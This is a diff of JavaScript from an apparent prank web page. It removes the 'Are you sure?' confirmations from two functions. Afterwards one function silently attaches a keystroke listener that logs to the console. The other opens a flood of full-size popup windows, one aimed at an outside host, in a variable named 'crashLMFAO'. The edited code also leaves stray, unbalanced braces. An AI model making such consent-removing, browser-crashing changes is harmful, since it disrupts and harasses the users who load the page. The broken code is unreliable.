@@ -138,7 +138,6 @@
       }
       var randomNumber = getRandomInt(0,9);
       function redPill() {
-        if (confirm("Are you sure?")) {
           window.addEventListener('keydown', (e) => {
             console.log(e)
           })
@@ -166,18 +165,12 @@
             }
             var randomLink = 'https://www.google.com/search?q='
           }
-        } else {
-          window.alert("All right. Try again when you're ready.")
-        }
-      }
+        } 
+  
       function bluePill() {
-        if (confirm("Are you sure?")) {
           for (let i=0; i<5; i++) {
             var crashLMFAO = window.open(url, "https://182.ooo/jam", "", "width=1920, height=1080");
             var smallWindow = window.open(url, "", "width=1920,height=1080");
-          }
-        } else {
-          window.alert("All right. Try again when you're ready.")
         }
       }
       function greenPill() {
